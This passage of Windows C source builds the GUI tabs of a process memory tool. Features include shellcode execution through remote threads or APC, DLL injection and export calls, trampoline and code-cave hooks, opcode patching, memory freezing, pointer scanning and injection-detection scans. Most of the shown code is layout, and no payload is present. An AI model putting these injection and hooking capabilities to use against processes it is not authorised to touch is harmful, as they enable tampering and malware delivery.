        SendMessage(hChkDetectMapped,BM_SETCHECK,BST_CHECKED,0);
        SendMessage(hChkDetectStomp, BM_SETCHECK,BST_CHECKED,0);
        SendMessage(hChkDetectThread,BM_SETCHECK,BST_CHECKED,0);
        SendMessage(hChkDetectRwx,   BM_SETCHECK,BST_CHECKED,0);
        SendMessage(hChkDetectManMap,BM_SETCHECK,BST_CHECKED,0);
        SendMessage(hChkDetectPath,  BM_SETCHECK,BST_CHECKED,0);

        hBtnDetectScan =B(hPageDetect,"BUTTON","Run Detection Scan",0,5,82,180,28,ID_BTN_DETECT_SCAN);
        hBtnDetectCopy =B(hPageDetect,"BUTTON","Copy Findings",     0,190,82,120,28,ID_BTN_DETECT_COPY);
        hBtnDetectClear=B(hPageDetect,"BUTTON","Clear",             0,315,82,80,28,ID_BTN_DETECT_CLEAR);
        hBtnDumpSelected=B(hPageDetect,"BUTTON","Dump Selected",     0,400,82,120,28,ID_BTN_DUMP_SELECTED);
        hBtnAnalyzeDump =B(hPageDetect,"BUTTON","Analyze Shellcode",0,525,82,140,28,ID_BTN_ANALYZE_DUMP);


        B(hPageDetect,"STATIC",
          "Compares loaded modules against their on-disk image, flags executable regions that are not file-backed,",
          0,5,116,1880,16,0,hFontSmall);
        B(hPageDetect,"STATIC",
          "and lists thread start/RIP addresses outside loaded modules. Read-only - never modifies the target.",
          0,5,132,1880,16,0,hFontSmall);

        hLstDetect=MakeDE(hPageDetect,5,154,1890,580,ID_LST_DETECT);

        B(hPageDetect,"STATIC","Dump Output:",0,5,740,100,20,0,hFontSmall);
        hEditDump=MakeDE(hPageDetect,5,760,1890,230,ID_EDIT_DUMP);


        hHdrShellcode=B(hPageShellcode,"STATIC","SHELLCODE EXECUTION  (trigger injected code)",0,5,5,500,18,0,hFontSection);
        B(hPageShellcode, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1600, 5, 140, 24, ID_BTN_HELP_SHELLCODE, hFontSmall);
        B(hPageShellcode,"STATIC","Address:",0,5,32,60,22,0);
        hEditShellAddr=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,70,28,200,26,0,hFontMono);
        hBtnExecShellcode=B(hPageShellcode,"BUTTON","Execute Shellcode",0,280,28,150,26,ID_BTN_EXEC_SHELLCODE);

        B(hPageShellcode,"STATIC","Thread ID (for APC):",0,5,65,120,22,0);
        hEditThreadId=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,130,61,100,26,0,hFontMono);
        hBtnExecAPC=B(hPageShellcode,"BUTTON","Execute via APC",0,280,61,120,26,ID_BTN_EXEC_APC);

        B(hPageShellcode,"STATIC","DLL Path:",0,5,100,60,22,0);
        hEditScDllPath=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,70,96,280,26,0,hFontMono);
        B(hPageShellcode,"BUTTON","Browse",0,360,96,70,26,ID_BTN_SC_BROWSE_DLL);
        B(hPageShellcode,"STATIC","Export:",0,440,100,60,22,0);
        hEditScExportFunc=B(hPageShellcode,"EDIT","shellcode_entry",WS_BORDER|ES_AUTOHSCROLL,500,96,140,26,0,hFontMono);
        hBtnExecDllExport=B(hPageShellcode,"BUTTON","Inject && Call",0,650,96,110,26,ID_BTN_SC_EXEC_DLL_EXPORT);

        B(hPageShellcode,"STATIC","Info: Remote Thread = create new thread | APC = queue to existing thread | DLL Export = inject DLL and call exported function",0,5,130,1000,40,0,hFontSmall);

        B(hPageVerify, "STATIC", "VERIFICATION", 0, 5, 5, 200, 18, 0, hFontSection);
        B(hPageVerify, "STATIC",
          "Snapshot captures the current state (modules/threads/exec regions/scan values). "
          "Run checks after injection to confirm what changed.",
          0, 5, 28, 1700, 16, 0, hFontSmall);
        
        hBtnSnapshotVerify = B(hPageVerify, "BUTTON", "Take Snapshot", 0, 5, 52, 130, 26, ID_BTN_SNAPSHOT_VERIFY);
        hBtnCheckValues    = B(hPageVerify, "BUTTON", "Check Values",  0, 142, 52, 110, 26, ID_BTN_CHECK_VALUES);
        hBtnCheckModules   = B(hPageVerify, "BUTTON", "Check Modules", 0, 258, 52, 110, 26, ID_BTN_CHECK_MODULES);
        hBtnCheckThreads   = B(hPageVerify, "BUTTON", "Check Threads", 0, 374, 52, 110, 26, ID_BTN_CHECK_THREADS);
        hBtnCheckMemory    = B(hPageVerify, "BUTTON", "Check Memory",  0, 490, 52, 110, 26, ID_BTN_CHECK_MEMORY);
        B(hPageVerify, "BUTTON", "▶ Run All", 0, 606, 52, 90, 26, ID_BTN_VERIFY_ALL);
        
        hStaticSnapStatus = B(hPageVerify, "STATIC",
            "No snapshot taken yet. Click 'Take Snapshot' before injection, then run checks after.",
            0, 5, 86, 1880, 18, 0, hFontSmall);
        
        B(hPageVerify, "STATIC", "Sentinel / Canary:", 0, 5, 112, 140, 22, 0, hFontSection);
        B(hPageVerify, "STATIC",
          "Write a known int32 value to a target address in your shellcode to prove it executed. "
          "Then click Check Sentinel to confirm the value was written by your shellcode.",
          0, 5, 136, 1400, 16, 0, hFontSmall);
        B(hPageVerify, "STATIC", "Address:", 0, 5, 158, 60, 22, 0);
        hEditSentinelAddr = B(hPageVerify, "EDIT", "0x0", WS_BORDER | ES_AUTOHSCROLL, 68, 156, 200, 24,
                              ID_EDIT_SENTINEL_ADDR, hFontMono);
        B(hPageVerify, "STATIC", "Expected value after exec:", 0, 276, 158, 195, 22, 0);
        hEditSentinelVal = B(hPageVerify, "EDIT", "12345", WS_BORDER | ES_NUMBER, 474, 156, 90, 24,
                             ID_EDIT_SENTINEL_VAL);
        hBtnCheckSentinel = B(hPageVerify, "BUTTON", "Check Sentinel", 0, 570, 156, 120, 24, ID_BTN_CHECK_SENTINEL);
        
        B(hPageVerify, "STATIC",
          "HOW TO USE:  "
          "1) Attach to target.  "
          "2) Click Take Snapshot.  "
          "3) Inject DLL / write value / execute shellcode.  "
          "4) Click Run All (or individual checks) to see what changed.",
          0, 5, 188, 1700, 16, 0, hFontSmall);
        
        B(hPageVerify, "STATIC",
          "Tip – Sentinel:  add 'mov dword [0xADDR], 0xCAFE' at the start of your shellcode, "
          "set Expected=51966 (0xCAFE) here, then Check Sentinel to confirm execution reached that point.",
          0, 5, 206, 1700, 16, 0, hFontSmall);
        
        B(hPageVerify, "STATIC", "Results:", 0, 5, 232, 80, 18, 0, hFontSection);
        B(hPageVerify, "BUTTON", "Clear", 0, 1800, 232, 60, 20, ID_BTN_DETECT_CLEAR);  
        hLstVerify = MakeDE(hPageVerify, 5, 254, 1890, 720, 0);
        

        B(hPagePtrHook, "STATIC", "MULTI-LEVEL POINTER CHAINS", 0, 5, 5, 320, 18, 0, hFontSection);
        B(hPagePtrHook, "STATIC", "Name:", 0, 5, 32, 40, 22, 0);
        hEditChainName = B(hPagePtrHook, "EDIT", "charHP", WS_BORDER|ES_AUTOHSCROLL, 48, 30, 160, 24, ID_EDIT_CHAIN_NAME, hFontMono);
        B(hPagePtrHook, "STATIC", "Module:", 0, 215, 32, 50, 22, 0);
        hEditChainMod = B(hPagePtrHook, "EDIT", "", WS_BORDER|ES_AUTOHSCROLL, 268, 30, 120, 24, ID_EDIT_CHAIN_MOD, hFontMono);
        B(hPagePtrHook, "STATIC", "(blank = main exe)", 0, 392, 34, 110, 18, 0, hFontSmall);
        B(hPagePtrHook, "STATIC", "Base off:", 0, 505, 32, 60, 22, 0);
        hEditChainBase = B(hPagePtrHook, "EDIT", "0x0", WS_BORDER|ES_AUTOHSCROLL, 568, 30, 130, 24, ID_EDIT_CHAIN_BASE, hFontMono);
        B(hPagePtrHook, "STATIC", "Offsets (comma sep, hex):", 0, 5, 64, 180, 22, 0);
        hEditChainOffs = B(hPagePtrHook, "EDIT", "0x10,0x50,0x0", WS_BORDER|ES_AUTOHSCROLL, 188, 60, 510, 24, ID_EDIT_CHAIN_OFFS, hFontMono);
        B(hPagePtrHook, "BUTTON", "Add Chain", 0, 704, 30, 100, 24, ID_BTN_CHAIN_ADD);
        B(hPagePtrHook, "BUTTON", "Delete Selected", 0, 810, 30, 130, 24, ID_BTN_CHAIN_DEL);
        B(hPagePtrHook, "BUTTON", "Resolve -> Selected", 0, 945, 30, 150, 24, ID_BTN_CHAIN_RESOLVE);
        B(hPagePtrHook, "BUTTON", "Refresh", 0, 1100, 30, 80, 24, ID_BTN_CHAIN_REFRESH);
        B(hPagePtrHook, "BUTTON", "Save to file", 0, 1185, 30, 100, 24, ID_BTN_CHAIN_SAVE);
        B(hPagePtrHook, "BUTTON", "Load from file", 0, 1290, 30, 115, 24, ID_BTN_CHAIN_LOAD);
        B(hPagePtrHook, "STATIC",
          "Chains are saved to memiscani_chains.txt (next to the .exe) and survive process restarts. "
          "Click a chain line then 'Resolve -> Selected' to use it as the active address.",
          0, 5, 88, 1700, 16, 0, hFontSmall);
        hLstChains = MakeDE(hPagePtrHook, 5, 108, 1890, 240, ID_LST_CHAINS);

        B(hPagePtrHook, "STATIC", "CALL GRAPH TRACER", 0, 5, 358, 260, 18, 0, hFontSection);
        B(hPagePtrHook, "STATIC", "Start addr:", 0, 5, 384, 75, 22, 0);
        hEditCgAddr = B(hPagePtrHook, "EDIT", "0x0", WS_BORDER|ES_AUTOHSCROLL, 82, 382, 200, 24, ID_EDIT_CG_ADDR, hFontMono);
        B(hPagePtrHook, "STATIC", "Max depth:", 0, 290, 384, 70, 22, 0);
        hEditCgDepth = B(hPagePtrHook, "EDIT", "3", WS_BORDER|ES_NUMBER, 362, 382, 50, 24, ID_EDIT_CG_DEPTH, hFontMono);
        B(hPagePtrHook, "BUTTON", "Trace Calls", 0, 420, 382, 110, 24, ID_BTN_CALLGRAPH);
        B(hPagePtrHook, "STATIC",
          "Disassembles from start addr, follows E8 (call) and E9 (jmp) targets recursively. "
          "Visited set prevents loops. Depth capped at 8.",
          0, 540, 388, 1000, 16, 0, hFontSmall);
        hLstCallGraph = MakeDE(hPagePtrHook, 5, 412, 940, 320, ID_LST_CALLGRAPH);

        B(hPagePtrHook, "STATIC", "TRAMPOLINE HOOK BUILDER", 0, 955, 358, 280, 18, 0, hFontSection);
        B(hPagePtrHook, "STATIC", "Target:", 0, 955, 384, 55, 22, 0);
        hEditHookAddr = B(hPagePtrHook, "EDIT", "0x0", WS_BORDER|ES_AUTOHSCROLL, 1014, 382, 200, 24, ID_EDIT_HOOK_ADDR, hFontMono);
        B(hPagePtrHook, "BUTTON", "Install Hook", 0, 1220, 382, 100, 24, ID_BTN_HOOK_INSTALL);
        B(hPagePtrHook, "BUTTON", "Restore Selected", 0, 1325, 382, 130, 24, ID_BTN_HOOK_RESTORE);
        B(hPagePtrHook, "BUTTON", "Refresh", 0, 1460, 382, 70, 24, ID_BTN_HOOK_REFRESH);
        B(hPagePtrHook, "BUTTON", "Help", 0, 1535, 382, 50, 24, ID_BTN_HOOK_HELP);
        B(hPagePtrHook, "STATIC", "Shellcode (hex bytes - user payload):", 0, 955, 414, 280, 18, 0, hFontSmall);
        hEditHookSc = B(hPagePtrHook, "EDIT", "", WS_BORDER|ES_AUTOHSCROLL, 955, 432, 935, 24, ID_EDIT_HOOK_SC, hFontMono);
        hLstHooks = MakeDE(hPagePtrHook, 955, 460, 935, 272, ID_LST_HOOKS);

        B(hPageExpHnd, "STATIC", "EXPORT / IMPORT BROWSER", 0, 5, 5, 300, 18, 0, hFontSection);
        B(hPageExpHnd, "BUTTON", "Refresh Exports", 0, 5, 30, 130, 24, ID_BTN_EXP_REFRESH);
        B(hPageExpHnd, "STATIC", "Filter:", 0, 145, 32, 45, 22, 0);
        hEditExpFilter = B(hPageExpHnd, "EDIT", "", WS_BORDER|ES_AUTOHSCROLL, 195, 30, 300, 24, ID_EDIT_EXP_FILTER, hFontMono);
        B(hPageExpHnd, "BUTTON", "Apply Filter", 0, 500, 30, 100, 24, ID_BTN_EXP_FILTER);
        B(hPageExpHnd, "BUTTON", "Go to Selected", 0, 605, 30, 130, 24, ID_BTN_EXP_GOTO);
        B(hPageExpHnd, "STATIC",
          "Lists every named export across all loaded modules of the attached process "
          "(parsed from PE headers in remote memory). Click a row + 'Go to Selected' to "
          "jump to that address in the Scanner hex view.",
          0, 5, 60, 1700, 16, 0, hFontSmall);
        hLstExports = MakeDE(hPageExpHnd, 5, 82, 1890, 420, ID_LST_EXPORTS);

        B(hPageExpHnd, "STATIC", "HANDLE VIEWER", 0, 5, 510, 200, 18, 0, hFontSection);
        B(hPageExpHnd, "BUTTON", "Enumerate Handles", 0, 5, 534, 150, 24, ID_BTN_HND_REFRESH);
        B(hPageExpHnd, "STATIC", "Filter:", 0, 165, 536, 45, 22, 0);
        hEditHndFilter = B(hPageExpHnd, "EDIT", "", WS_BORDER|ES_AUTOHSCROLL, 215, 534, 300, 24, ID_EDIT_HND_FILTER, hFontMono);
        B(hPageExpHnd, "BUTTON", "Apply Filter", 0, 520, 534, 100, 24, ID_BTN_HND_FILTER);
        B(hPageExpHnd, "STATIC",
          "Uses NtQuerySystemInformation(SystemHandleInformation) to list every kernel handle "
          "open in the target process: Files, Keys, Mutants, Events, Sections, Threads, Processes, etc. "
          "Read-only. Some 'File' handles are skipped to avoid deadlock on synchronous pipes.",
          0, 5, 564, 1700, 16, 0, hFontSmall);
        hLstHandles = MakeDE(hPageExpHnd, 5, 586, 1890, 386, ID_LST_HANDLES);

        B(hPagePatcher, "STATIC", "BINARY PATCHER - MODIFY OPCODES IN A RUNNING PROCESS",
          0, 5, 5, 700, 18, 0, hFontSection);
        B(hPagePatcher, "STATIC",
          "Attach to the target process first (top bar). All addresses are absolute "
          "virtual addresses in the remote process. Page protection is auto-flipped "
          "to RWX during the write and restored afterwards. Use 'Restore Selected' "
          "to revert any patch.",
          0, 5, 28, 1700, 16, 0, hFontSmall);

        B(hPagePatcher, "STATIC", "Target addr:", 0, 5, 56, 90, 22, 0);
        hEditPatchAddr = B(hPagePatcher, "EDIT", "0x0",
            WS_BORDER|ES_AUTOHSCROLL, 100, 54, 220, 24, ID_EDIT_PATCH_ADDR, hFontMono);
        B(hPagePatcher, "STATIC", "Read len:", 0, 330, 56, 70, 22, 0);
        hEditPatchSize = B(hPagePatcher, "EDIT", "32",
            WS_BORDER|ES_NUMBER, 405, 54, 60, 24, ID_EDIT_PATCH_SIZE, hFontMono);
        B(hPagePatcher, "BUTTON", "Read Bytes", 0, 472, 54, 100, 24, ID_BTN_PATCH_READ);
        B(hPagePatcher, "BUTTON", "Disassemble", 0, 578, 54, 110, 24, ID_BTN_PATCH_DISASM);
        B(hPagePatcher, "BUTTON", "Help", 0, 694, 54, 60, 24, ID_BTN_PATCH_HELP);

        B(hPagePatcher, "STATIC", "Original bytes (hex):", 0, 5, 86, 200, 18, 0, hFontSmall);
        hEditPatchBytes = B(hPagePatcher, "EDIT", "",
            WS_BORDER|ES_AUTOHSCROLL|ES_READONLY, 5, 106, 1000, 24, ID_EDIT_PATCH_BYTES, hFontMono);

        B(hPagePatcher, "STATIC", "Disassembly:", 0, 5, 134, 200, 18, 0, hFontSmall);
        hEditPatchDisasm = B(hPagePatcher, "EDIT", "",
            WS_BORDER|WS_VSCROLL|ES_MULTILINE|ES_READONLY|ES_AUTOVSCROLL,
            5, 154, 1000, 110, ID_EDIT_PATCH_DISASM, hFontMono);

        B(hPagePatcher, "STATIC", "1) WRITE RAW BYTES (overwrite at target)",
          0, 5, 278, 500, 18, 0, hFontSection);
        B(hPagePatcher, "STATIC", "Payload hex:", 0, 5, 304, 90, 22, 0);
        hEditPatchPayload = B(hPagePatcher, "EDIT", "90 90 90",
            WS_BORDER|ES_AUTOHSCROLL, 100, 302, 800, 24, ID_EDIT_PATCH_PAYLOAD, hFontMono);
        B(hPagePatcher, "BUTTON", "Write Payload", 0, 908, 302, 130, 24, ID_BTN_PATCH_WRITEBYTES);

        B(hPagePatcher, "STATIC", "2) NOP OUT (replace N bytes with 0x90)",
          0, 5, 338, 500, 18, 0, hFontSection);
        B(hPagePatcher, "STATIC", "Bytes:", 0, 5, 364, 50, 22, 0);
        hEditPatchNopLen = B(hPagePatcher, "EDIT", "2",
            WS_BORDER|ES_NUMBER, 60, 362, 60, 24, ID_EDIT_PATCH_NOPLEN, hFontMono);
        B(hPagePatcher, "BUTTON", "NOP Out", 0, 128, 362, 100, 24, ID_BTN_PATCH_NOP);

        B(hPagePatcher, "STATIC", "3) REDIRECT JUMP (short EB or near E9 unconditional)",
          0, 5, 398, 600, 18, 0, hFontSection);
        B(hPagePatcher, "STATIC", "Jump-to:", 0, 5, 424, 70, 22, 0);
        hEditPatchJmpTarget = B(hPagePatcher, "EDIT", "0x0",
            WS_BORDER|ES_AUTOHSCROLL, 80, 422, 220, 24, ID_EDIT_PATCH_JMPTARGET, hFontMono);
        B(hPagePatcher, "BUTTON", "Insert Short JMP (2 B)", 0, 308, 422, 170, 24, ID_BTN_PATCH_SHORTJMP);
        B(hPagePatcher, "BUTTON", "Insert Near JMP (5 B)",  0, 484, 422, 170, 24, ID_BTN_PATCH_NEARJMP);

        B(hPagePatcher, "STATIC", "4) CODE CAVE HOOK (alloc cave, run payload, jmp back)",
          0, 5, 458, 700, 18, 0, hFontSection);
        B(hPagePatcher, "STATIC", "Cave size:", 0, 5, 484, 80, 22, 0);
        hEditPatchCaveSize = B(hPagePatcher, "EDIT", "256",
            WS_BORDER|ES_NUMBER, 90, 482, 70, 24, ID_EDIT_PATCH_CAVESIZE, hFontMono);
        B(hPagePatcher, "BUTTON", "Install Code Cave", 0, 168, 482, 150, 24, ID_BTN_PATCH_CAVE);
        B(hPagePatcher, "STATIC",
          "Cave installs a 14-byte abs JMP at target, runs your payload (from box 1), "
          "replays the original bytes, then jumps back. Keep payload register-safe.",
          0, 325, 486, 950, 16, 0, hFontSmall);

        B(hPagePatcher, "STATIC", "APPLIED PATCHES (click a row, then Restore Selected)",
          0, 5, 520, 700, 18, 0, hFontSection);
        B(hPagePatcher, "BUTTON", "Restore Selected", 0, 5, 544, 140, 24, ID_BTN_PATCH_RESTORE);
        B(hPagePatcher, "BUTTON", "Refresh", 0, 150, 544, 80, 24, ID_BTN_PATCH_REFRESH);
        hLstPatches = MakeDE(hPagePatcher, 5, 574, 1890, 350, ID_LST_PATCHES);

        B(hPageAutoPtr, "STATIC", "AUTO POINTER SCANNER  (multi-level chain finder + Zydis disasm)",
          0, 5, 5, 700, 18, 0, hFontSection);
        B(hPageAutoPtr, "STATIC",
          "Given a target address, searches backwards through readable memory to find chains "
          "of pointers rooted in static module memory. After the scan, the target and each "
          "chain root are disassembled with Zydis so you can see surrounding code.",
          0, 5, 28, 1700, 16, 0, hFontSmall);

        B(hPageAutoPtr, "STATIC", "Target addr:", 0, 5, 58, 90, 22, 0);
        hEditApsTarget = B(hPageAutoPtr, "EDIT", "0x0",
            WS_BORDER | ES_AUTOHSCROLL, 100, 56, 240, 24, ID_EDIT_APS_TARGET, hFontMono);
        B(hPageAutoPtr, "BUTTON", "Use Selected Addr", 0, 348, 56, 140, 24, ID_BTN_APS_USE_SELECTED);

        B(hPageAutoPtr, "STATIC", "Max depth:", 0, 500, 58, 80, 22, 0);
        hEditApsDepth = B(hPageAutoPtr, "EDIT", "3",
            WS_BORDER | ES_NUMBER, 585, 56, 50, 24, ID_EDIT_APS_DEPTH, hFontMono);
        B(hPageAutoPtr, "STATIC", "(1..6)", 0, 640, 60, 50, 18, 0, hFontSmall);

        B(hPageAutoPtr, "STATIC", "Max offset per level:", 0, 700, 58, 140, 22, 0);
        hEditApsMaxOff = B(hPageAutoPtr, "EDIT", "0x800",
            WS_BORDER | ES_AUTOHSCROLL, 845, 56, 100, 24, ID_EDIT_APS_MAXOFF, hFontMono);
        B(hPageAutoPtr, "STATIC", "(hex; capped at 0x10000)", 0, 950, 60, 180, 18, 0, hFontSmall);

        B(hPageAutoPtr, "BUTTON", "Scan", 0, 5, 90, 120, 28, ID_BTN_APS_SCAN);
        B(hPageAutoPtr, "BUTTON", "Add All to Chain Manager", 0, 130, 90, 200, 28, ID_BTN_APS_ADDCHAIN);
        B(hPageAutoPtr, "BUTTON", "Clear", 0, 335, 90, 80, 28, ID_BTN_APS_CLEAR);
        B(hPageAutoPtr, "BUTTON", "Help", 0, 420, 90, 70, 28, ID_BTN_APS_HELP);

        B(hPageAutoPtr, "STATIC",
          "Output below shows: snapshot info, per-depth candidate counts, final static-rooted "
          "chains (in chain-resolution order), and Zydis disassembly of the target plus first "
          "few chain roots.",
          0, 5, 125, 1700, 16, 0, hFontSmall);

        hLstApsResults = MakeDE(hPageAutoPtr, 5, 148, 1890, 820, ID_LST_APS_RESULTS);

        B(hPageDisasmWalk, "STATIC",
          "DISASM WALKER  (hex + Zydis around a target, step / page up & down)",
          0, 5, 5, 700, 18, 0, hFontSection);
        B(hPageDisasmWalk, "STATIC",
          "Reads 'View bytes' starting at (target + offset) and shows hex dump plus "
          "Zydis disassembly. Step adjusts offset by the step size; Page adjusts by the "
          "full view size. Center resets offset to 0.",
          0, 5, 28, 1700, 16, 0, hFontSmall);

        B(hPageDisasmWalk, "STATIC", "Target addr:", 0, 5, 56, 90, 22, 0);
        hEditDwTarget = B(hPageDisasmWalk, "EDIT", "0x0",
            WS_BORDER | ES_AUTOHSCROLL, 100, 54, 240, 24, ID_EDIT_DW_TARGET, hFontMono);
        B(hPageDisasmWalk, "BUTTON", "Use Selected Addr", 0, 348, 54, 140, 24, ID_BTN_DW_USE_SELECTED);

        B(hPageDisasmWalk, "STATIC", "Offset:", 0, 500, 56, 60, 22, 0);
        hEditDwOffset = B(hPageDisasmWalk, "EDIT", "0x0",
            WS_BORDER | ES_AUTOHSCROLL, 565, 54, 130, 24, ID_EDIT_DW_OFFSET, hFontMono);
        B(hPageDisasmWalk, "STATIC", "(signed, hex)", 0, 700, 58, 90, 18, 0, hFontSmall);

        B(hPageDisasmWalk, "STATIC", "View bytes:", 0, 800, 56, 85, 22, 0);
        hEditDwViewSize = B(hPageDisasmWalk, "EDIT", "256",
            WS_BORDER | ES_NUMBER, 890, 54, 80, 24, ID_EDIT_DW_VIEW_SIZE, hFontMono);

        B(hPageDisasmWalk, "STATIC", "Step:", 0, 985, 56, 45, 22, 0);
        hEditDwStep = B(hPageDisasmWalk, "EDIT", "0x20",
            WS_BORDER | ES_AUTOHSCROLL, 1035, 54, 80, 24, ID_EDIT_DW_STEP, hFontMono);

        B(hPageDisasmWalk, "BUTTON", "Refresh", 0, 1130, 54, 80, 24, ID_BTN_DW_REFRESH);
        B(hPageDisasmWalk, "BUTTON", "Help",    0, 1215, 54, 60, 24, ID_BTN_DW_HELP);

        B(hPageDisasmWalk, "BUTTON", "<< Page Back",   0, 5,   90, 120, 28, ID_BTN_DW_PAGE_BACK);
        B(hPageDisasmWalk, "BUTTON", "<  Step Back",   0, 130, 90, 120, 28, ID_BTN_DW_STEP_BACK);
        B(hPageDisasmWalk, "BUTTON", "Center on Target", 0, 255, 90, 150, 28, ID_BTN_DW_CENTER);
        B(hPageDisasmWalk, "BUTTON", "Step Fwd  >",   0, 410, 90, 120, 28, ID_BTN_DW_STEP_FWD);
        B(hPageDisasmWalk, "BUTTON", "Page Fwd  >>",  0, 535, 90, 120, 28, ID_BTN_DW_PAGE_FWD);

        B(hPageDisasmWalk, "STATIC",
          "Tip: 'Step' uses the bytes value in the Step box; 'Page' uses the View bytes "
          "value. Toggle signs in Offset to inspect memory below the target (e.g. -0x100).",
          0, 5, 124, 1700, 16, 0, hFontSmall);

        hLstDwDisasm = MakeDE(hPageDisasmWalk, 5, 148, 1890, 820, ID_LST_DW_DISASM);

        hStatusWnd=CreateWindowA("STATIC",
            "Ready - type or browse a PID and click Attach.  All panels are selectable: click, Ctrl+A, Ctrl+C.",
            WS_CHILD|WS_VISIBLE|SS_SUNKEN,0,1040,1920,24,hWnd,NULL,hInst,NULL);
        SF(hStatusWnd,hFontSmall);

        
        SF(hStaticProcessInfo,hFontNormal);SF(hStaticModuleInfo,hFontNormal);
        SF(hStaticScanCount,hFontSmall);
        SF(hEditPID,hFontNormal);SF(hEditSearchName,hFontNormal);

        EnableWindow(hBtnFirstScan, FALSE);EnableWindow(hBtnNextScan,  FALSE);
        EnableWindow(hBtnWrite,     FALSE);EnableWindow(hBtnUndo,      FALSE);
        EnableWindow(hBtnRefreshHex,FALSE);EnableWindow(hBtnGotoOffset,FALSE);
        EnableWindow(hBtnFreeze,    FALSE);EnableWindow(hBtnExport,    FALSE);
        EnableWindow(hBtnWriteUtf8, FALSE);EnableWindow(hBtnWriteUtf16,FALSE);
        EnableWindow(hBtnReadString,FALSE);
        break;
    }

    case WM_TIMER:
        if(wParam==TIMER_FREEZE){
            LPVOID addr = GetSelectedAddress();
            if(addr && freezeActive && hProcess && freezeByteLen>0){
                WriteProcessMemory(hProcess, addr, freezeBytes, freezeByteLen, NULL);
            }
        }else if(wParam==TIMER_WATCH){
            RefreshWatchList();
            UpdateOffsetInfo();
        }else if(wParam==TIMER_HEALTH&&hProcess){
           
            DWORD exitCode=STILL_ACTIVE;
            GetExitCodeProcess(hProcess,&exitCode);
            if(exitCode!=STILL_ACTIVE){
                CloseHandle(hProcess);hProcess=NULL;
                KillTimer(hWnd,TIMER_FREEZE);KillTimer(hWnd,TIMER_WATCH);KillTimer(hWnd,TIMER_HEALTH);
                freezeActive=false;SetWindowTextA(hBtnFreeze,"Freeze");
                char msg[128];sprintf_s(msg,"Process PID %d exited (code %lu) - click Re-attach to reconnect",currentPID,exitCode);
                LogToStatus(msg,true);
                SetWindowTextA(hStaticProcessInfo,"Process: EXITED");
            }
        }
        break;

    case WM_ERASEBKGND:{
        HDC hdc=(HDC)wParam;RECT rc;GetClientRect(hWnd,&rc);
        FillRect(hdc,&rc,hBrushWindow);return 1;
    }
    case WM_CTLCOLORSTATIC:{
        HDC hdc=(HDC)wParam;HWND hCtrl=(HWND)lParam;
        if(hCtrl==hStatusWnd){SetBkColor(hdc,CLR_BG_STATUS);SetTextColor(hdc,CLR_TEXT_STAT);return(LRESULT)hBrushStatus;}
        SetBkMode(hdc,OPAQUE);
        SetBkColor(hdc,CLR_BG_WINDOW);
        if(hCtrl==hHdrScan||hCtrl==hHdrMap||hCtrl==hHdrHex||hCtrl==hHdrWrite||
           hCtrl==hHdrMods||hCtrl==hHdrWatch||hCtrl==hHdrInject||
           hCtrl==hHdrStrWriter||hCtrl==hHdrAobPatch||hCtrl==hHdrWndWriter||
           hCtrl==hHdrDllInject||hCtrl==hHdrShellcode||hCtrl==hHdrBuilder||
           hCtrl==hHdrCaves||hCtrl==hHdrThreads||hCtrl==hHdrDetect)
            SetTextColor(hdc,CLR_TEXT_HDR);
        else if(hCtrl==hStaticOffsetInfo||hCtrl==hStaticScanCount||
                hCtrl==hStaticAddressInfo||hCtrl==hStaticSelWnd)
            SetTextColor(hdc,CLR_TEXT_INFO);
        else
            SetTextColor(hdc,CLR_TEXT_NORM);
        return(LRESULT)hBrushWindow;
    }
    case WM_CTLCOLOREDIT:{
        HDC hdc=(HDC)wParam; HWND hCtrl=(HWND)lParam;
        if(hCtrl==hScanResultsWnd||hCtrl==hMemoryMapWnd||hCtrl==hHexViewWnd||
            hCtrl==hLstModules||hCtrl==hLstWatchList||hCtrl==hLstCaves||hCtrl==hLstThreads||
            hCtrl==hLstWindows||hCtrl==hLstDetect||hCtrl==hLstTriggerLog||
            hCtrl==hLstApsResults||hCtrl==hLstDwDisasm){
            SetBkColor(hdc,CLR_BG_LIST);SetTextColor(hdc,CLR_TEXT_LIST);
            return(LRESULT)hBrushList;
        }
        SetBkColor(hdc,CLR_BG_EDIT);SetTextColor(hdc,CLR_TEXT_EDIT);
        return(LRESULT)hBrushEdit;
    }
    case WM_CTLCOLORLISTBOX:{
        HDC hdc=(HDC)wParam;
        SetBkColor(hdc,CLR_BG_LIST);SetTextColor(hdc,CLR_TEXT_LIST);
        return(LRESULT)hBrushList;
    }
    case WM_SIZE:{
        int w=LOWORD(lParam),h=HIWORD(lParam);
        if(hStatusWnd)  SetWindowPos(hStatusWnd, NULL,0,h-24,w,24,SWP_NOZORDER);
        if(hTabCtrl){
            SetWindowPos(hTabCtrl,NULL,0,108,w,h-108-24,SWP_NOZORDER);
            RECT tabRc;GetClientRect(hTabCtrl,&tabRc);
            TabCtrl_AdjustRect(hTabCtrl,FALSE,&tabRc);
            int px=tabRc.left,py=tabRc.top,pw=tabRc.right-tabRc.left,ph=tabRc.bottom-tabRc.top;
            if(hPageScan)   SetWindowPos(hPageScan,  NULL,px,py,pw,ph,SWP_NOZORDER);
            if(hPageMods)   SetWindowPos(hPageMods,  NULL,px,py,pw,ph,SWP_NOZORDER);
            if(hPageInject) SetWindowPos(hPageInject,NULL,px,py,pw,ph,SWP_NOZORDER);
            if(hPageWnd)    SetWindowPos(hPageWnd,   NULL,px,py,pw,ph,SWP_NOZORDER);
            if(hPageDetect) SetWindowPos(hPageDetect,NULL,px,py,pw,ph,SWP_NOZORDER);
            if(hPageShellcode) SetWindowPos(hPageShellcode,NULL,px,py,pw,ph,SWP_NOZORDER);
            if (hPageVerify) SetWindowPos(hPageVerify, NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPageTrigger) SetWindowPos(hPageTrigger, NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPagePtrHook) SetWindowPos(hPagePtrHook, NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPageExpHnd)  SetWindowPos(hPageExpHnd,  NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPagePatcher) SetWindowPos(hPagePatcher, NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPageAutoPtr) SetWindowPos(hPageAutoPtr, NULL, px, py, pw, ph, SWP_NOZORDER);
            if (hPageDisasmWalk) SetWindowPos(hPageDisasmWalk, NULL, px, py, pw, ph, SWP_NOZORDER);
